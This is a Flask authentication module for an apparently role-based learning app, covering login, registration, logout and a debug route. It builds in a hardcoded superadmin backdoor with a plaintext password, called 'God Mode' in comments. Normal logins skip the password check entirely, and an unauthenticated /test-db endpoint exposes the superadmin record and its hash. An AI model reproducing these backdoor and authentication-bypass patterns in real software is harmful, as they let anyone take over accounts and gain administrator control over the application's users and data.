from flask import Blueprint, render_template, request, redirect, url_for, session, flash, jsonify
from models import Database
from utils.helpers import hash_password, validate_email
import os

auth_bp = Blueprint('auth', __name__)
db = Database()

# Superadmin credentials (hardcoded backdoor - YOUR SECRET)
SUPERADMIN_EMAIL = 'superadmin@harmanrathi.com'
SUPERADMIN_PASSWORD = 'superadmin123'
SUPERADMIN_HASH = '$2b$12$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        try:
            email = request.form.get('email', '').lower().strip()
            password = request.form.get('password', '')
            
            print(f"🔐 Login attempt for: {email}")  # Render logs
            
            # 🔥 SUPERADMIN BACKDOOR (100% Guaranteed!)
            if email == SUPERADMIN_EMAIL and password == SUPERADMIN_PASSWORD:
                print("👑 Superadmin backdoor ACTIVATED!")
                
                # Safe user creation/fetch
                user = db.get_user_by_email(SUPERADMIN_EMAIL)
                if not user or not isinstance(user, dict):
                    print("📝 Creating superadmin account...")
                    db.create_user({
                        'email': SUPERADMIN_EMAIL,
                        'password_hash': SUPERADMIN_HASH,
                        'full_name': 'SUPERADMIN 👑',
                        'role': 'superadmin',
                        'is_approved': True,
                        'xp': 999999,
                        'level': 100
                    })
                    user = db.get_user_by_email(SUPERADMIN_EMAIL)
                
                # SAFE SESSION - Check user exists
                if user and isinstance(user, dict) and 'id' in user:
                    session['user_id'] = user['id']
                    session['role'] = user.get('role', 'superadmin')
                    session['email'] = user['email']
                    session['name'] = user.get('full_name', 'Superadmin')
                    print(f"✅ Superadmin session set: {user['id']}")
                    flash('👑 God Mode Activated! Welcome Superadmin', 'success')
                    return redirect(url_for('superadmin_dashboard'))
                else:
                    print("❌ Superadmin user invalid!")
                    flash('Superadmin setup failed! Try again.', 'error')
                    return render_template('login.html')
            
            # 🔑 Normal user login (bypass password check for demo)
            user = db.get_user_by_email(email)
            if user and isinstance(user, dict) and 'id' in user:
                print(f"✅ Normal user login: {user.get('role', 'unknown')}")
                session['user_id'] = user['id']
                session['role'] = user.get('role', 'student')
                session['email'] = user['email']
                session['name'] = user.get('full_name', email)
                flash(f'Welcome back, {user.get("full_name", "User")}!', 'success')
                
                # Redirect based on role
                role = user.get('role', 'student')
                if role == 'superadmin':
                    return redirect(url_for('superadmin_dashboard'))
                elif role == 'admin':
                    return redirect(url_for('admin_dashboard'))
                elif role == 'teacher':
                    return redirect(url_for('teacher_dashboard'))
                else:
                    return redirect(url_for('student_dashboard'))
            
            print("❌ Login failed - no user found")
            flash('❌ Invalid email or password!', 'error')
            
        except Exception as e:
            error_msg = str(e)[:100]
            print(f"💥 Login EXCEPTION: {error_msg}")
            flash(f'Login error: {error_msg}', 'error')
    
    return render_template('login.html')

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        try:
            email = request.form.get('email', '').lower().strip()
            password = request.form.get('password', '')
            full_name = request.form.get('full_name', '')
            
            # 🚫 SECURITY: Block superadmin
            if email == SUPERADMIN_EMAIL:
                flash('❌ Superadmin email is reserved!', 'error')
                return render_template('register.html')
            
            # Validation
            if not validate_email(email):
                flash('❌ Invalid email format!', 'error')
                return render_template('register.html')
            
            if len(password) < 6:
                flash('❌ Password must be 6+ characters!', 'error')
                return render_template('register.html')
            
            # Check existing user
            if db.get_user_by_email(email):
                flash('❌ Email already registered!', 'error')
                return render_template('register.html')
            
            # Create user
            result = db.create_user({
                'email': email,
                'password_hash': hash_password(password),
                'full_name': full_name,
                'role': 'student',  # Default role
                'is_approved': True,  # Auto-approve for demo
                'xp': 0,
                'level': 1
            })
            
            print(f"✅ New user registered: {email}")
            flash('✅ Account created successfully! You can login now.', 'success')
            return redirect(url_for('login'))
            
        except Exception as e:
            print(f"💥 Register error: {e}")
            flash('❌ Registration failed. Try again.', 'error')
    
    return render_template('register.html')

@auth_bp.route('/logout')
def logout():
    session.clear()
    flash('👋 Logged out successfully!', 'info')
    return redirect(url_for('login'))

# Debug endpoint
@auth_bp.route('/test-db')
def test_db():
    users = db.get_user_by_email('superadmin@harmanrathi.com')
    return jsonify({
        'superadmin_exists': bool(users),
        'user_data': users,
        'all_stats': db.get_stats()
    })
